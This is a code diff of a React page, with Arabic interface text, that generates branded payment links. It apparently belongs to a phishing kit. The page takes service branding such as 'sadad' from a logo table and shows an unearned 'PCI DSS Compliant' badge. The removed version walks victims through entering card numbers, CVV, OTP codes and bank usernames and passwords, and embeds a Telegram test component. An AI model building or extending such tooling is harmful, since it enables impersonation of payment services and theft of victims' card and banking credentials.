@@ -1,367 +1,165 @@
-import { useState, useMemo } from "react";
+import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
-import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { useCreateLink } from "@/hooks/useSupabase";
-import { getCountryByCode } from "@/lib/countries";
-import { getServiceBranding } from "@/lib/serviceLogos";
-import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
-import { getCompanyMeta } from "@/utils/companyMeta";
-import { getCurrency, getDefaultTitle } from "@/utils/countryData";
-import { generatePaymentLink } from "@/utils/paymentLinks";
-import { CreditCard, DollarSign, Hash, Building2, Copy, ExternalLink, FileText } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
-import TelegramTest from "@/components/TelegramTest";
+import { Copy, Eye, Check, Loader2, Sparkles, ShieldCheck } from "lucide-react";
 import BottomNav from "@/components/BottomNav";
 import BackButton from "@/components/BackButton";
-import {
-  AlertDialog,
-  AlertDialogAction,
-  AlertDialogContent,
-  AlertDialogDescription,
-  AlertDialogFooter,
-  AlertDialogHeader,
-  AlertDialogTitle,
-} from "@/components/ui/alert-dialog";
+import { serviceLogos } from "@/lib/serviceLogos";
+import { useQuery } from "@tanstack/react-query";
 
 const CreatePaymentLink = () => {
-  const { country } = useParams();
+  const { countryCode } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
   const createLink = useCreateLink();
-  const countryData = getCountryByCode(country?.toUpperCase() || "");
+  
+  const [amount, setAmount] = useState("");
+  const [description, setDescription] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [generatedUrl, setGeneratedUrl] = useState("");
+  const [copied, setCopied] = useState(false);
 
-  const [paymentAmount, setPaymentAmount] = useState("500");
-  const [paymentMethod, setPaymentMethod] = useState("card");
-  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
-  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
-  const [linkId, setLinkId] = useState("");
+  const queryParams = new URLSearchParams(window.location.search);
+  const serviceKey = (queryParams.get("service") || "sadad").toLowerCase();
+  const branding = serviceLogos[serviceKey] || serviceLogos["sadad"];
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-
-    if (!paymentAmount || parseFloat(paymentAmount) <= 0) {
-      toast({
-        title: "خطأ",
-        description: "الرجاء إدخال مبلغ صحيح",
-        variant: "destructive",
-      });
+  const handleCreate = async () => {
+    if (!amount || isNaN(Number(amount))) {
+      toast({ title: "خطأ", description: "الرجاء إدخال مبلغ صحيح", variant: "destructive" });
       return;
     }
 
+    setIsSubmitting(true);
     try {
       const payload = {
-        payment_amount: parseFloat(paymentAmount) || 500,
-        currency_code: getCurrencyCode(country || "SA"),
-        payment_method: paymentMethod,
-        selectedCountry: country || "SA",
+        service_key: serviceKey,
+        payment_amount: Number(amount),
+        description: description,
+        selectedCountry: countryCode
       };
-      
-      console.log('[CreatePaymentLink] Creating link with payload:', payload);
-      
-      const link = await createLink.mutateAsync({
-        type: "payment",
-        country_code: country || "",
-        payload: payload,
+
+      const result = await createLink.mutateAsync({
+        countryCode: countryCode || "SA",
+        payload: payload
       });
 
-      // Generate unified payment URL using the new function
-      const paymentUrl = generatePaymentLink({
-        invoiceId: link.id,
-        company: "payment",
-        country: country || 'SA',
-        amount: parseFloat(paymentAmount) || 500,
-        currency: getCurrencyCode(country || "SA"),
-        paymentMethod: paymentMethod,
-      });
-
-      setCreatedPaymentUrl(paymentUrl);
-      setLinkId(link.id);
-      setShowSuccessDialog(true);
-
-      toast({
-        title: "تم إنشاء رابط السداد بنجاح!",
-        description: "يمكنك الآن مشاركة الرابط مع العميل",
-      });
-    } catch (error) {
-      // Error creating payment link
-      toast({
-        title: "خطأ في إنشاء الرابط",
-        description: "حدث خطأ أثناء إنشاء رابط السداد",
-        variant: "destructive",
-      });
+      const url = `${window.location.origin}/pay/${result.id}`;
+      setGeneratedUrl(url);
+      toast({ title: "تم النجاح", description: "تم إنشاء رابط الدفع بنجاح" });
+    } catch (err) {
+      console.error(err);
+      toast({ title: "خطأ", description: "فشل إنشاء الرابط", variant: "destructive" });
+    } finally {
+      setIsSubmitting(false);
     }
   };
 
-
-  if (!countryData) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
-        <div className="text-center p-8">
-          <CreditCard className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
-          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
-          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
-          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
-        </div>
-      </div>
-    );
-  }
+  const copyToClipboard = () => {
+    navigator.clipboard.writeText(generatedUrl);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+    toast({ title: "تم النسخ", description: "تم نسخ الرابط إلى الحافظة" });
+  };
 
   return (
-    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
-      <div className="container mx-auto px-4">
-        <div className="mb-4">
+    <div className="min-h-screen bg-gray-50/50 pb-32" dir="rtl">
+      <div className="bg-white border-b border-gray-100 px-4 py-6 sticky top-0 z-50">
+        <div className="container mx-auto max-w-xl flex items-center justify-between">
           <BackButton />
+          <div className="flex flex-col items-center">
+             <h1 className="text-sm font-black text-gray-400 uppercase tracking-widest mb-1">مولد الروابط</h1>
+             <div className="font-black text-gray-900">{branding.nameAr}</div>
+          </div>
+          <div className="w-10" />
         </div>
-        
-        {/* Telegram Test Component */}
-        <div className="mb-6">
-          <TelegramTest />
-        </div>
+      </div>
 
-        <div className="max-w-2xl mx-auto">
-          <Card className="p-4 shadow-elevated">
-            <div
-              className="h-16 -m-4 mb-4 rounded-t-xl relative"
-              style={{
-                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
-              }}
-            >
-              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
-              <div className="absolute bottom-2 right-4 text-white">
-                <h1 className="text-lg font-bold">إنشاء رابط سداد</h1>
-                <p className="text-xs opacity-90">{countryData.nameAr}</p>
-              </div>
+      <div className="container mx-auto px-4 py-8 max-w-xl">
+        <div className="bg-white rounded-3xl border border-gray-100 shadow-2xl p-8 overflow-hidden relative">
+          <div className="absolute top-0 left-0 right-0 h-2" style={{ background: branding.colors.primary }} />
+          
+          <div className="flex justify-center mb-8">
+            <div className="w-20 h-20 rounded-2xl bg-gray-50 flex items-center justify-center border border-gray-100 shadow-inner">
+               <img src={branding.logo} className="w-12 h-12 object-contain" />
+            </div>
+          </div>
+
+          <div className="space-y-6">
+            <div className="space-y-2">
+              <Label className="font-black text-gray-700">المبلغ المستحق</Label>
+              <Input 
+                type="number" 
+                placeholder="0.00" 
+                className="h-16 text-2xl font-black text-center border-2 border-gray-100 rounded-2xl focus:ring-primary focus:border-primary"
+                value={amount}
+                onChange={(e) => setAmount(e.target.value)}
+              />
             </div>
 
-            <form onSubmit={handleSubmit} className="space-y-4">
+            <div className="space-y-2">
+              <Label className="font-black text-gray-700">وصف الخدمة (اختياري)</Label>
+              <Input 
+                placeholder="مثلاً: رسوم توثيق الهوية" 
+                className="h-14 font-bold border-gray-100 rounded-xl"
+                value={description}
+                onChange={(e) => setDescription(e.target.value)}
+              />
+            </div>
 
-              {/* Payment Amount */}
-              <div>
-                <Label className="mb-2 flex items-center gap-2 text-sm">
-                  <DollarSign className="w-3 h-3" />
-                  مبلغ السداد
-                  {country && (
-                    <span className="text-xs text-muted-foreground">
-                      ({getCurrencyName(country)})
-                    </span>
-                  )}
-                </Label>
-                <Input
-                  type="number"
-                  value={paymentAmount}
-                  onChange={(e) => setPaymentAmount(e.target.value)}
-                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
-                  className="h-9 text-sm"
-                  step="0.01"
-                  min="0"
-                />
-                {country && (
-                  <p className="text-xs text-muted-foreground mt-1">
-                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
-                  </p>
-                )}
-              </div>
-
-              {/* Payment Method Selection */}
-              <div>
-                <Label className="mb-3 flex items-center gap-2 text-sm font-semibold">
-                  <CreditCard className="w-4 h-4" />
-                  طريقة الدفع *
-                </Label>
-                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                  {/* Card Payment Option */}
-                  <button
-                    type="button"
-                    onClick={() => setPaymentMethod('card')}
-                    className={`relative p-4 rounded-lg border-2 transition-all duration-200 text-right ${
-                      paymentMethod === 'card'
-                        ? 'border-primary bg-primary/5 shadow-md'
-                        : 'border-border hover:border-primary/50 bg-card'
-                    }`}
-                  >
-                    <div className="flex items-start gap-3">
-                      <div className={`p-2 rounded-full ${
-                        paymentMethod === 'card' ? 'bg-primary text-white' : 'bg-muted text-muted-foreground'
-                      }`}>
-                        <CreditCard className="w-5 h-5" />
-                      </div>
-                      <div className="flex-1">
-                        <h4 className={`font-semibold text-sm mb-1 ${
-                          paymentMethod === 'card' ? 'text-primary' : 'text-foreground'
-                        }`}>
-                          بيانات البطاقة
-                        </h4>
-                        <p className="text-xs text-muted-foreground">
-                          إدخال بيانات البطاقة مباشرة
-                        </p>
-                        <div className="mt-2 text-xs text-muted-foreground">
-                          <div className="flex items-center gap-1">
-                            <span>📋</span>
-                            <span>بيانات المستلم</span>
-                          </div>
-                          <div className="flex items-center gap-1 mt-1">
-                            <span>💳</span>
-                            <span>بيانات البطاقة</span>
-                          </div>
-                          <div className="flex items-center gap-1 mt-1">
-                            <span>🔐</span>
-                            <span>رمز التحقق OTP</span>
-                          </div>
-                        </div>
-                      </div>
-                      {paymentMethod === 'card' && (
-                        <div className="absolute top-2 left-2">
-                          <div className="w-5 h-5 rounded-full bg-primary flex items-center justify-center">
-                            <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
-                              <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
-                            </svg>
-                          </div>
-                        </div>
-                      )}
-                    </div>
-                  </button>
-
-                  {/* Bank Login Option */}
-                  <button
-                    type="button"
-                    onClick={() => setPaymentMethod('bank_login')}
-                    className={`relative p-4 rounded-lg border-2 transition-all duration-200 text-right ${
-                      paymentMethod === 'bank_login'
-                        ? 'border-primary bg-primary/5 shadow-md'
-                        : 'border-border hover:border-primary/50 bg-card'
-                    }`}
-                  >
-                    <div className="flex items-start gap-3">
-                      <div className={`p-2 rounded-full ${
-                        paymentMethod === 'bank_login' ? 'bg-primary text-white' : 'bg-muted text-muted-foreground'
-                      }`}>
-                        <Building2 className="w-5 h-5" />
-                      </div>
-                      <div className="flex-1">
-                        <h4 className={`font-semibold text-sm mb-1 ${
-                          paymentMethod === 'bank_login' ? 'text-primary' : 'text-foreground'
-                        }`}>
-                          تسجيل دخول البنك
-                        </h4>
-                        <p className="text-xs text-muted-foreground">
-                          تسجيل الدخول عبر البنك الإلكتروني
-                        </p>
-                        <div className="mt-2 text-xs text-muted-foreground">
-                          <div className="flex items-center gap-1">
-                            <span>📋</span>
-                            <span>بيانات المستلم</span>
-                          </div>
-                          <div className="flex items-center gap-1 mt-1">
-                            <span>🏦</span>
-                            <span>اختيار البنك</span>
-                          </div>
-                          <div className="flex items-center gap-1 mt-1">
-                            <span>🔑</span>
-                            <span>تسجيل الدخول للبنك</span>
-                          </div>
-                          <div className="flex items-center gap-1 mt-1">
-                            <span>🔐</span>
-                            <span>رمز التحقق OTP</span>
-                          </div>
-                        </div>
-                      </div>
-                      {paymentMethod === 'bank_login' && (
-                        <div className="absolute top-2 left-2">
-                          <div className="w-5 h-5 rounded-full bg-primary flex items-center justify-center">
-                            <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
-                              <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
-                            </svg>
-                          </div>
-                        </div>
-                      )}
-                    </div>
-                  </button>
-                </div>
-                
-                {/* Info Box */}
-                <div className={`mt-3 p-3 rounded-lg text-xs ${
-                  paymentMethod === 'card' 
-                    ? 'bg-blue-50 dark:bg-blue-950/20 text-blue-700 dark:text-blue-300 border border-blue-200 dark:border-blue-800'
-                    : 'bg-green-50 dark:bg-green-950/20 text-green-700 dark:text-green-300 border border-green-200 dark:border-green-800'
-                }`}>
-                  <div className="flex items-start gap-2">
-                    <span className="text-base">ℹ️</span>
-                    <div>
-                      {paymentMethod === 'card' ? (
-                        <>
-                          <p className="font-semibold mb-1">خطوات الدفع ببيانات البطاقة:</p>
-                          <ol className="space-y-1 mr-4 list-decimal">
-                            <li>إدخال بيانات المستلم (الاسم، رقم الجوال)</li>
-                            <li>إدخال بيانات البطاقة (رقم البطاقة، تاريخ الانتهاء، CVV)</li>
-                            <li>إدخال رمز التحقق OTP المرسل من البنك</li>
-                          </ol>
-                        </>
-                      ) : (
-                        <>
-                          <p className="font-semibold mb-1">خطوات الدفع عبر تسجيل دخول البنك:</p>
-                          <ol className="space-y-1 mr-4 list-decimal">
-                            <li>إدخال بيانات المستلم (الاسم، رقم الجوال)</li>
-                            <li>اختيار البنك الذي تتعامل معه</li>
-                            <li>تسجيل الدخول باسم المستخدم وكلمة المرور للبنك</li>
-                            <li>إدخال رمز التحقق OTP المرسل من البنك</li>
-                          </ol>
-                        </>
-                      )}
-                    </div>
-                  </div>
-                </div>
-              </div>
-
-              <Button
-                type="submit"
-                size="lg"
-                className="w-full h-11 text-white mt-6"
-                style={{
-                  background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`
-                }}
-                disabled={createLink.isPending}
+            {!generatedUrl ? (
+              <Button 
+                onClick={handleCreate} 
+                disabled={isSubmitting}
+                className="w-full h-16 rounded-2xl font-black text-lg transition-all hover:scale-[1.02] active:scale-[0.98]"
+                style={{ background: branding.colors.primary }}
               >
-                {createLink.isPending ? "جاري الإنشاء..." : "إنشاء رابط السداد"}
+                {isSubmitting ? <Loader2 className="animate-spin" /> : "إنشاء رابط الدفع الآمن"}
               </Button>
-            </form>
-          </Card>
+            ) : (
+              <div className="animate-in fade-in zoom-in duration-500 space-y-4">
+                <div className="p-4 bg-green-50 border border-green-100 rounded-2xl flex items-center gap-3">
+                  <div className="bg-green-500 p-2 rounded-full">
+                    <Check className="w-4 h-4 text-white" />
+                  </div>
+                  <div className="text-sm font-black text-green-700">تم إنشاء الرابط بنجاح</div>
+                </div>
+
+                <div className="p-4 bg-gray-50 border border-gray-100 rounded-2xl break-all font-mono text-xs text-center text-gray-500">
+                  {generatedUrl}
+                </div>
+
+                <div className="grid grid-cols-2 gap-3">
+                  <Button 
+                    onClick={copyToClipboard}
+                    variant="outline"
+                    className="h-14 rounded-xl font-black gap-2 border-2"
+                  >
+                    {copied ? <Check className="w-4 h-4 text-green-600" /> : <Copy className="w-4 h-4" />}
+                    {copied ? "تم النسخ" : "نسخ الرابط"}
+                  </Button>
+                  <Button 
+                    onClick={() => window.open(generatedUrl, '_blank')}
+                    className="h-14 rounded-xl font-black gap-2"
+                    style={{ background: branding.colors.primary }}
+                  >
+                    <Eye className="w-4 h-4" />
+                    معاينة
+                  </Button>
+                </div>
+              </div>
+            )}
+          </div>
         </div>
 
-        {/* Success Dialog */}
-        <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
-          <AlertDialogContent className="sm:max-w-md" dir="rtl">
-            <AlertDialogHeader>
-              <AlertDialogTitle className="text-right">✅ تم إنشاء رابط السداد بنجاح!</AlertDialogTitle>
-              <AlertDialogDescription className="text-right">
-                يمكنك الآن مشاركة هذا الرابط مع العميل لدفع المبلغ المطلوب
-              </AlertDialogDescription>
-            </AlertDialogHeader>
-            <AlertDialogFooter className="flex flex-row gap-2 justify-start">
-              <Button
-                variant="outline"
-                onClick={() => window.open(createdPaymentUrl, '_blank')}
-                className="flex-1"
-              >
-                <ExternalLink className="w-4 h-4 ml-2" />
-                معاينة الرابط
-              </Button>
-              <AlertDialogAction
-                onClick={() => {
-                  navigate(`/pay/${linkId}/data`);
-                }}
-                className="flex-1"
-              >
-                إدخال بيانات السداد
-              </AlertDialogAction>
-            </AlertDialogFooter>
-          </AlertDialogContent>
-        </AlertDialog>
+        <div className="mt-8 flex items-center justify-center gap-2 opacity-30 grayscale">
+           <ShieldCheck className="w-4 h-4" />
+           <span className="text-[10px] font-black uppercase tracking-widest">PCI DSS Compliant Infrastructure</span>
+        </div>
       </div>
-      <div className="h-20" />
       <BottomNav />
     </div>
   );
